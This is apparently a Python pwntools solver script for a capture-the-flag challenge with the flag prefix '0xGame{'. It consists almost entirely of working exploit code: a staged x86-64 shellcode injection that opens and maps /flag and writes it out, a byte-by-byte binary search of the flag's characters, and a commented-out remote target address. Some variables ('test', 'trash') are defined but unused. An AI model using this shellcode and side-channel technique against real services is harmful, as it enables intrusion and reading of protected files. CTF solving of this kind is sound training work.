from pwn import *
context(arch='amd64', os='linux', log_level='debug')
flag="0xGame{"
while 1:    
    curr_pos=len(flag)
    left=32
    right=126
    while left!=right:
        warning(f"{curr_pos}: {left}~{right}")
        s=process("./test")
        pause()
        #s=remote("192.168.3.253",54000)
        #pause()
        s.sendafter(b"code:\n",asm("push rdx;pop rsi;push rdx;pop r15;xor rdi,rdi;xor rax,rax;syscall"))
        mid=int((left+right)/2)
        scbase=f"""
        push r15  # r15 = shellcode base
        pop rdi
        xor rsi,rsi
        xor rdx,rdx
        push 2
        pop rax
        syscall   # open
        mov r8,rax
        mov rdi,0
        mov rsi,0x1000
        mov rdx,7
        mov r10,2 # MAP_SHARED
        mov r9,0
        mov rax,9
        syscall   # mmap(0,0x1000,7,MAP_SHARED,flag_fd,0)
        mov rsi,rax
        mov rdi,2
        mov rdx,0x100
        mov rax,1
        syscall
        """
        test="""
        pop r14
        cmp byte ptr [r14+{curr_pos}],{mid}
        ja loop
        push 0x3b
        pop rax
        syscall
        loop:
        jmp loop
        """
        trash="""
        push rdi
        pop rsi
        add rsi,0x600
        push rax
        pop rdi
        xor rax,rax
        inc dh
        syscall   # read(flag_fd,shellcode_base+0x600,0x100)
        push rsi
        """
        s.recvline()
        #pause()
        s.send(b"/flag\0".ljust(0x10,b"\x90")+asm(scbase))
        #pause()
        try:
            dat=s.recv()
        except EOFError:
            right=mid
            s.close()
            continue
        left=mid+1
        #pause()
        s.close()
    flag+=chr(left)
    warning(flag)
    if flag[-1]=="}":
        success(flag)
        exit(0)